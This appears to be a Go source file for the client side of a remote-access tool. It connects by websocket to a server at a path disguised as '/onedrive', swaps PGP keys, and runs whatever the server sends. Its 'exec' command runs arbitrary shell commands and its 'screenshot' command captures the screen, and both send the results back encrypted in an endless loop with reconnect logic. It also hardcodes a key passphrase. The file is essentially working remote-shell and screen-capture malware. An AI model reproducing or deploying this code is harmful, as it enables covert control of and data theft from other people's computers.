package main

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"reflect"
	"strconv"
	"time"

	_ "image/png"

	"github.com/ProtonMail/gopenpgp/v2/crypto"
	"github.com/ProtonMail/gopenpgp/v2/helper"
	"github.com/gorilla/websocket"

	"github.com/notcat/tcpsockettest/client/commands"
)

var (
	connHost = "localhost"
	connPort = "8080"
	debug    = false

	connError = 0

	// Encryption key parameters
	name, _    = os.Hostname()
	email      = "zoey@gmail.com"
	passphrase = []byte("mysupersecurepassword")
)

// Message contains a Command (type of command to execute) and an Args (arguments to pass through)
type Message struct {
	Command string // type of execution
	Args    string
}

func main() {
	var _ = reflect.TypeOf(Message{})

	// Check for correct amount of arguments
	if len(os.Args) == 4 {
		var err error
		connHost = os.Args[1]

		// No need to parse connPort as int as we need it as a string in the future
		connPort = os.Args[2]
		debug, err = strconv.ParseBool(os.Args[3])
		if err != nil {
			log.Panic(err.Error())
		}
	} else { // Fallback to default debug values
		log.Print("Insufficient args provided, falling back to defaults.")
	}

	conn, ecPrivKeyString, servPubKey, err := connect()
	if err != nil {
		for connError < 4 {
			log.Println(err)

			connError++

			log.Println("Error Connecting, Retry Count: " + fmt.Sprint(connError))

			timeout, _ := time.ParseDuration("15s")
			time.Sleep(timeout)

			conn, ecPrivKeyString, servPubKey, err = connect()

			if err == nil {
				waitForMessage(*conn, ecPrivKeyString, servPubKey)
				return
			}
		}
	} else {
		waitForMessage(*conn, ecPrivKeyString, servPubKey)
	}
}

func connect() (conn *websocket.Conn, cPrivKey string, sPubKey string, err error) {
	// Connect to the host
	fmt.Println("Connecting to  host " + connHost + ":" + string(connPort))

	conn, _, err = websocket.DefaultDialer.Dial("ws://"+connHost+":"+connPort+"/onedrive", nil)
	if err != nil {
		return &websocket.Conn{}, "", "", err
	}

	log.Println("Connected!")

	// Get the servers public key they send to us on connection
	_, bytes, err := conn.ReadMessage()
	if err != nil {
		conn.Close()
		fmt.Println("Client had issue connecting.")
	}

	// convert armored string into crypto.Key type
	var servPubKey = string(bytes) // we only need it as string

	// OUR private key generation

	// Generate private key String using Curve25519 algorithm and the parameters above
	ecPrivKeyString, err := helper.GenerateKey(name, email, passphrase, "x25519", 0)
	if err != nil {
		fmt.Println(err.Error())
	}

	// Makes a Private Key *crypto.Key from a Private Key string (ecPrivKeyString)
	ecPrivKey, err := crypto.NewKeyFromArmored(ecPrivKeyString)

	// Public key string to distribute to clients to encrypt their output they want to send back to me with
	// I only have the private key to decrypt the message they send to prevent MITM attacks
	ecPubKey, err := ecPrivKey.GetArmoredPublicKey()

	conn.WriteMessage(websocket.TextMessage, []byte(ecPubKey))

	return conn, ecPrivKeyString, servPubKey, err
}

func waitForMessage(conn websocket.Conn, pKey string, servPubKey string) {
	_, bytes, err := conn.ReadMessage()
	if err != nil {
		fmt.Println(err)

		// Reset connection error count when we try reconnecting
		connError = 0
		main()
		return
	}

	fmt.Println("recieved, attemtping to decrypt")

	// buffer is the string to decrypt

	// Decrypt the message on the server using our Private Key, the Private Key passphrase, and the Encrypted Message string.
	decrypted, err := helper.DecryptMessageArmored(pKey, passphrase, string(bytes))
	if err != nil {
		fmt.Println(err)
	}

	// Print the decrypted message
	fmt.Println(decrypted)

	var message Message
	err = json.Unmarshal([]byte(decrypted), &message)
	if err != nil {
		fmt.Println(err)
	}

	if message.Command == "exec" {
		res, err := commands.Exec(message.Args)
		if err != nil {
			fmt.Println(err)
		}
		print("exec'd " + message.Args)

		// send back the output of the command
		encryptedRes, err := sendInput(message.Command, res, servPubKey)
		if err != nil {
			fmt.Println(err)
		}

		conn.WriteMessage(websocket.TextMessage, []byte(encryptedRes))
	}
	if message.Command == "screenshot" {
		res, err := commands.Take()
		if err != nil {
			log.Println(err)
			res = "fail"
		}

		// send back the output of the command
		encryptedRes, err := sendInput(message.Command, res, servPubKey)
		if err != nil {
			log.Println(err)
		}

		conn.WriteMessage(websocket.TextMessage, []byte(encryptedRes))
		log.Println("Sent to server")
	}

	// TODO: wait 3 seconds
	// call itself recursively
	waitForMessage(conn, pKey, servPubKey)
}

func sendInput(command string, res string, servPubKey string) (string, error) {
	message := Message{
		Command: command,
		Args:    res,
	}

	jsonData, err := json.Marshal(message)
	if err != nil {
		fmt.Println(err.Error())
	}

	armor, err := helper.EncryptMessageArmored(servPubKey, string(jsonData))
	if err != nil {
		fmt.Println(err.Error())
	}

	return armor, err
}
